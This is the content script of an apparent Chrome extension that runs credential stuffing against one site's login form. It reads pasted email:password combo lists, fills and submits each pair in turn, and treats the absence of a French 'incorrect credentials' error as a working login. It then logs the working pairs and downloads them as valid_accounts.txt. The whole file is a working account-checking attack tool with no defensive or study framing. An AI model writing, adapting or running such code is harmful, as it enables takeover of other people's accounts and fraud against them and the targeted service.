let accounts = [];
let currentIndex = 0;
let validAccounts = [];

function parseAccounts(inputText) {
  let lines = inputText.split("\n");
  return lines
    .map((line) => {
      let parts = line.split(" | ")[0].split(":");
      return { email: parts[0].trim(), password: parts[1]?.trim() || "" };
    })
    .filter((account) => account.email && account.password);
}

function downloadValidAccounts() {
  if (validAccounts.length === 0) {
    alert("No valid accounts found.");
    return;
  }

  let content = validAccounts.join("\n");
  let blob = new Blob([content], { type: "text/plain" });
  let url = URL.createObjectURL(blob);
  let a = document.createElement("a");
  a.href = url;
  a.download = "valid_accounts.txt";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}

function checkNextAccount() {
  if (currentIndex >= accounts.length) {
    alert("Finished checking all accounts.");
    downloadValidAccounts();
    return;
  }

  let emailInput = document.querySelector(".email-input__field--H4fRW");
  let passwordInput = document.querySelector(".password-input__field--Qgoe0");
  let loginButton = document.querySelector("[data-t='login-button']");

  if (!emailInput || !passwordInput || !loginButton) {
    alert("Login fields not found on this page.");
    return;
  }

  let { email, password } = accounts[currentIndex];

  // Ensure email and password fields are properly filled
  emailInput.value = email;
  emailInput.dispatchEvent(new Event("input", { bubbles: true }));

  passwordInput.value = password;
  passwordInput.setAttribute("value", password); // Ensure it updates in the DOM
  passwordInput.dispatchEvent(new Event("input", { bubbles: true }));

  setTimeout(() => {
    if (!loginButton.disabled) {
      loginButton.click(); // Click login button

      setTimeout(() => {
        let errorMessage = document.querySelector(
          ".flash-message__text---c7Df"
        );

        if (
          errorMessage &&
          errorMessage.innerText.includes(
            "L'e-mail ou le mot de passe est incorrect"
          )
        ) {
          console.log(`Invalid: ${email}`);
        } else {
          console.log(`Valid: ${email} | Password: ${password}`);
          validAccounts.push(`${email}:${password}`);
        }

        currentIndex++;
        checkNextAccount();
      }, 4000); // Wait for login response
    } else {
      console.log(`Invalid: ${email} (Button disabled)`);
      currentIndex++;
      checkNextAccount();
    }
  }, 1500); // Allow time for fields to update
}

// Listen for messages from popup.js
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "startCheck" && request.accounts) {
    accounts = parseAccounts(request.accounts);
    currentIndex = 0;
    validAccounts = [];
    checkNextAccount();
  }
});
